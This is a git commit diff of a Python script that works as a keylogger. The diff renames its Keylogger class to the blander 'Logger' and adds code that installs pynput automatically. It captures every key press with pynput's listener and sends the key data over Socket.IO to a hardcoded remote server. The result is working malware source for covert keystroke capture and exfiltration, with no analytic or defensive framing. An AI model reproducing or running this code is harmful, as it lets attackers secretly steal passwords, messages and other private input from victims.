13a6d01e250d1b3c072b40e1c14a7a9260ead814
John Raymark LLavanes <112992662+Marksuuuu@users.noreply.github.com>
2023-09-11 09:26:32 +0800

    Add files via upload

--- main.py
+++ main.py
@@ -2,13 +2,13 @@ import os
 import sys
 import subprocess
 import socketio
-from pynput.keyboard import Listener
 
 sio = socketio.Client()
 
 class PackageManager:
     def __init__(self):
         self.add_python_to_path()
+        self.install_pynput()
 
     def add_python_to_path(self):
         python_dir = sys.exec_prefix
@@ -19,18 +19,19 @@ class PackageManager:
         else:
             print(f"Python {sys.version} is already in the PATH.")
 
-    def install_packages_from_file(self, file_path):
-        with open(file_path, 'r') as package_file:
-            packages_to_install = package_file.read().splitlines()
-
-        for package in packages_to_install:
+    def install_pynput(self):
+        try:
+            import pynput
+        except ImportError:
             try:
-                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-                print(f"Successfully installed {package}.")
-            except subprocess.CalledProcessError:
-                print(f"Failed to install {package}.")
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
+                print("Successfully installed 'pynput'.")
 
-class Keylogger:
+            except subprocess.CalledProcessError:
+                print("Failed to install 'pynput'.")
+                sys.exit(1)
+
+class Logger:
     def __init__(self, server_url):
         self.server_url = server_url
 
@@ -41,24 +42,18 @@ class Keylogger:
             print(f"Error sending key data to the server: {str(e)}")
 
     def start_logging(self):
-        with Listener(on_press=self.on_key_press) as listener:
+        from pynput.keyboard import Listener as KeyboardListener
+        
+        with KeyboardListener(on_press=self.on_key_press) as listener:
             listener.join()
 
 if __name__ == "__main__":
-    package_manager = PackageManager()
-
-    # Specify the path to the packages file
-    packages_file_path = "requirements.txt"
-
-    package_manager.install_packages_from_file(packages_file_path)
-
-    # Specify the server URL for Socket.IO
-    server_url = "http://127.0.0.1:5000"  # Replace with your actual server URL
-
-    keylogger = Keylogger(server_url)
+    server_url = "http://10.0.2.150:5050"  # Replace with your actual server URL
 
     sio.connect(server_url)
 
-    keylogger.start_logging()
+    package_manager = PackageManager()
+    logger = Logger(server_url)
+    logger.start_logging()
 
     sio.wait()
